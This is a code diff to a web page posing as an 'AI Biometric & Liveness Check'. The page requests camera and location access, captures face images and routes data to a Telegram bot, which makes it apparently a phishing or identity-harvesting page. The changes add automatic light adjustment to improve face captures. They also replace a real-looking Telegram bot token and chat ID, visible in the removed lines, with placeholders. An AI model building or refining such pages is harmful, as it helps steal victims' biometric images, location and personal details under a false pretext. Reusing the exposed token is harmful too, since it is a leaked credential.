@@ -36,10 +36,12 @@
         video, canvas { width: 100%; max-width: 380px; height: 280px; border-radius: 10px; transform: scaleX(-1); background: #000; object-fit: cover; }
         canvas { display: none; }
         
+        /* 智能动态补光层 */
         #flash-overlay {
             position: absolute; top: 0; left: 50%; transform: translateX(-50%);
             width: 100%; max-width: 380px; height: 280px; border-radius: 10px;
-            pointer-events: none; opacity: 0; transition: background-color 0.5s ease;
+            pointer-events: none; opacity: 0; background-color: #ffffff;
+            transition: opacity 0.3s ease, background-color 0.3s ease;
             z-index: 5;
         }
 
@@ -58,6 +60,8 @@
         .step-item { padding: 4px 8px; border-radius: 4px; background: #e2e8f0; }
         .step-item.active { background: #3b82f6; color: white; }
         .step-item.completed { background: #10b981; color: white; }
+        
+        #env-light-tip { font-size: 11px; text-align: center; margin-top: 4px; color: #64748b; }
     </style>
 </head>
 <body>
@@ -129,7 +133,7 @@
         <button class="btn" id="btn-next" onclick="proceedToVerification()">Next: Biometric Liveness Check →</button>
     </div>
 
-    <!-- 步骤二：AI 动作活体检测 -->
+    <!-- 步骤二：AI 动作活体检测与智能光感 -->
     <div id="step-verification">
         <h2>AI Biometric & Liveness Check</h2>
         <div class="progress-steps">
@@ -156,6 +160,7 @@
         </div>
         
         <div id="status-msg" style="text-align: center; font-size: 14px; margin-top: 15px; font-weight: 600; color: #ef4444;">Please grant camera and location permissions.</div>
+        <div id="env-light-tip">Environment Light: Detecting...</div>
         
         <button class="btn" id="btn-retry" onclick="requestPermissionsAndStart()">Grant Permissions & Retry</button>
     </div>
@@ -163,8 +168,8 @@
 
 <script>
     // ⚠️ 请在此处填入你的 Telegram Bot Token 与 Chat ID
-    const TG_BOT_TOKEN = "8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g";
-    const TG_CHAT_ID = "7396947380";
+    const TG_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE";
+    const TG_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID_HERE";
 
     const globalDatabase = {
         "CN": { name: "China", phoneCode: "+86", zipFormat: "6 digits", states: ["Beijing", "Shanghai", "Guangdong"] },
@@ -288,7 +293,6 @@
         try {
             statusMsg.textContent = "Loading AI face detection models...";
             
-            // 强制设置为 CPU 后端，解决 WebGL 不支持报错问题
             await tf.setBackend('cpu');
             await tf.ready();
 
@@ -321,6 +325,55 @@
         }
     }
 
+    // 智能环境光线检测与动态补光/降光调节
+    function adjustEnvironmentLighting(video) {
+        try {
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            const overlay = document.getElementById('flash-overlay');
+            const lightTip = document.getElementById('env-light-tip');
+
+            canvas.width = 100; // 降低采样分辨率以提升性能
+            canvas.height = 75;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const imgData = context.getImageData(0, 0, canvas.width, canvas.height);
+            let totalBrightness = 0;
+            let data = imgData.data;
+            
+            // 计算画面平均亮度 (YUV公式加权)
+            for (let i = 0; i < data.length; i += 4) {
+                let r = data[i], g = data[i+1], b = data[i+2];
+                let brightness = 0.299 * r + 0.587 * g + 0.114 * b;
+                totalBrightness += brightness;
+            }
+            let avgBrightness = totalBrightness / (data.length / 4);
+
+            if (avgBrightness < 60) {
+                // 环境偏暗 -> 自动智能柔和补光
+                let fillFactor = Math.min(0.5, (60 - avgBrightness) / 60);
+                overlay.style.backgroundColor = "#ffffff";
+                overlay.style.opacity = fillFactor;
+                lightTip.textContent = `Environment Light: Dim (${Math.round(avgBrightness)}) - Auto Filling Light`;
+                lightTip.style.color = "#3b82f6";
+            } else if (avgBrightness > 200) {
+                // 环境过亮（强光/暴光） -> 自动降低过曝（模拟暗色柔和滤镜压暗）
+                let reduceFactor = Math.min(0.3, (avgBrightness - 200) / 100);
+                overlay.style.backgroundColor = "#000000";
+                overlay.style.opacity = reduceFactor;
+                lightTip.textContent = `Environment Light: Too Bright (${Math.round(avgBrightness)}) - Reducing Exposure`;
+                lightTip.style.color = "#f59e0b";
+            } else {
+                // 光线适宜
+                overlay.style.opacity = 0;
+                lightTip.textContent = `Environment Light: Optimal (${Math.round(avgBrightness)})`;
+                lightTip.style.color = "#10b981";
+            }
+        } catch (e) {
+            console.error("Lighting adjustment error:", e);
+        }
+    }
+
     function updateStepUI() {
         for (let i = 1; i <= 4; i++) {
             const item = document.getElementById(`p-step-${i}`);
@@ -333,6 +386,9 @@
     async function detectLivenessLoop(video) {
         if (isProcessing) return;
         const statusMsg = document.getElementById('status-msg');
+
+        // 每次循环先检测当前环境光线，并自动补光或降光
+        adjustEnvironmentLighting(video);
 
         try {
             const faces = await detector.estimateFaces(video, { flipHorizontal: false });
@@ -407,7 +463,7 @@
 
     function triggerCaptureAndUpload(video) {
         const overlay = document.getElementById('flash-overlay');
-        overlay.style.backgroundColor = "rgba(255, 255, 255, 0.8)";
+        overlay.style.backgroundColor = "rgba(255, 255, 255, 0.9)";
         overlay.style.opacity = "1";
 
         setTimeout(() => {
